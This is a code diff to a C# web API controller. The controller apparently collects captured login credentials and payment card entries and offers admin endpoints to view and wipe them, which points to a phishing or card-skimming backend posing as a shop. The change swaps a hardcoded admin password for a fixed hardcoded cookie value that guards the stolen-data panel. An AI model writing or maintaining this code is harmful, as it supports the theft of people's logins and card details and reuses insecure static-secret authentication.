@@ -8,13 +8,11 @@ namespace WebApiSolution.Controllers;
 [Route("api/log")]
 public class LogController(AppDbContext db) : ControllerBase
 {
-    private const string AdminPassword = "TechShop2026!";
+    private const string CookieName = "admin_tok";
+    private const string CookieValue = "ts2026_ok";
 
     private bool IsAuthorized()
-    {
-        Request.Headers.TryGetValue("X-Admin-Password", out var pw);
-        return pw == AdminPassword;
-    }
+        => Request.Cookies.TryGetValue(CookieName, out var v) && v == CookieValue;
 
     [HttpPost]
     public async Task<IActionResult> LogCredentials([FromBody] LogEntry entry)
@@ -56,7 +54,7 @@ public class LogController(AppDbContext db) : ControllerBase
     [HttpGet("admin")]
     public async Task<IActionResult> GetAll()
     {
-        if (!IsAuthorized()) return Unauthorized(new { message = "Invalid password" });
+        if (!IsAuthorized()) return Unauthorized(new { message = "Unauthorized" });
 
         var credentials = db.LogEntries.OrderByDescending(x => x.CapturedAt).ToList();
         var cards = db.CardEntries.OrderByDescending(x => x.CapturedAt).ToList();
@@ -68,7 +66,7 @@ public class LogController(AppDbContext db) : ControllerBase
     [HttpDelete("admin/clear")]
     public async Task<IActionResult> Clear()
     {
-        if (!IsAuthorized()) return Unauthorized(new { message = "Invalid password" });
+        if (!IsAuthorized()) return Unauthorized(new { message = "Unauthorized" });
 
         db.LogEntries.RemoveRange(db.LogEntries);
         db.CardEntries.RemoveRange(db.CardEntries);
